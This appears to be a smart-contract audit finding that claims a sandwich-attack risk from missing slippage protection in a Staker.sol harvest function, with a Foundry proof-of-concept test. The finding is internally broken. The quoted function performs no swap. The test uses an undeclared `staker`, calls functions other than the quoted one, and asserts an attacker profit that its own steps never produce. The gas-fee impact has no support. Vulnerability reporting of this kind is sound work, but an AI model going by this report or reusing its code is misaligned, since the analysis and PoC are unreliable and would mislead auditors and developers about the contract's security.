# Lack of Slippage Protection in Staker.sol

### Summary

The `_harvestAndReport` function in Staker.sol lacks slippage protection when claiming rewards from the accountant. This makes the function vulnerable to sandwich attacks where an attacker can manipulate the price of rewards before and after the claim, potentially extracting value from the strategy.

### Root Cause

In `staker.sol`, the reward claiming process doesn't include any slippage protection:

`
function _harvestAndReport() internal override returns (uint256 _totalAssets) {
    ACCOUNTANT.distribute(address(asset)); // Claim yBOLD
    _totalAssets = asset.balanceOf(address(this));
}
`

### Internal Pre-conditions

1. Strategy must have rewards to claim

2. Accountant must have sufficient rewards to distribute

3. Strategy must be in active state

### External Pre-conditions

1. Attacker must have ability to manipulate reward token price.
2. Attacker must have sufficient capital to execute sandwich attack.
3. The attacker must be able to front-run and back-run the claim transaction.


### Attack Path

1. Attacker monitors the `mempool` for reward claim transactions
When detected, the attacker:
- Front-runs with a large buy of reward tokens
- Strategy claims rewards at an inflated price
- Attacker back-runs with a sell of reward token
- Strategy receives fewer rewards than expected due to price manipulation

### Impact

Legitimate users will be forced to pay a higher gas fee.
Loss of reward value through price manipulation.

contract StakerTest is Test {

    MockRewardToken public rewardToken;
    MockStakingToken public stakingToken;
    MockRouter public router;
    
    address public owner;
    address public attacker;
    address public user;
    
    function setUp() public {
        // Deploy mocks
        rewardToken = new MockRewardToken();
        stakingToken = new MockStakingToken();
        router = new MockRouter();
        
        // Setup accounts
        owner = makeAddr("owner");
        attacker = makeAddr("attacker");
        user = makeAddr("user");

        staker.setRewardDuration(7 days);
        staker.setRewardRate(100 ether); // 100 tokens per second
        vm.stopPrank();
        
        // Fund accounts
        stakingToken.mint(user, 1000 ether);
        stakingToken.mint(attacker, 1000 ether);
        
        // User stakes tokens
        vm.startPrank(user);
        stakingToken.approve(address(staker), type(uint256).max);
        staker.stake(1000 ether);
        vm.stopPrank();
    }

    function testSlippageAttack() public {
        // 1. Setup initial state
        uint256 initialRewardBalance = rewardToken.balanceOf(address(staker));
        uint256 initialUserBalance = rewardToken.balanceOf(user);
        
        // 2. Attacker front-runs with large swap
        vm.startPrank(attacker);
        rewardToken.mint(address(router), 1000 ether);
        router.setOutputAmount(0); // Set minimum possible output
        staker.getReward();
        vm.stopPrank();
        
        // 3. Record state after attack
        uint256 postAttackRewardBalance = rewardToken.balanceOf(address(staker));
        uint256 postAttackUserBalance = rewardToken.balanceOf(user);
        
        // 4. User tries to claim rewards
        vm.startPrank(user);
        staker.getReward();
        vm.stopPrank();
        
        // 5. Verify attack was successful
        uint256 finalUserBalance = rewardToken.balanceOf(user);
        
        // Calculate expected rewards
        uint256 expectedRewards = (block.timestamp - staker.lastUpdateTime()) * staker.rewardRate();
        
        // Verify user received much less than expected
        assertLt(
            finalUserBalance - initialUserBalance,
            expectedRewards,
            "User received less rewards than expected due to slippage"
        );
        
        // Verify attacker profited
        assertGt(
            rewardToken.balanceOf(attacker),
            0,
            "Attacker should have profited from the attack"
        );
        
        // Log the loss
        console.log("Expected rewards:", expectedRewards);
        console.log("Actual rewards received:", finalUserBalance - initialUserBalance);
        console.log("Reward loss:", expectedRewards - (finalUserBalance - initialUserBalance));
    }
}
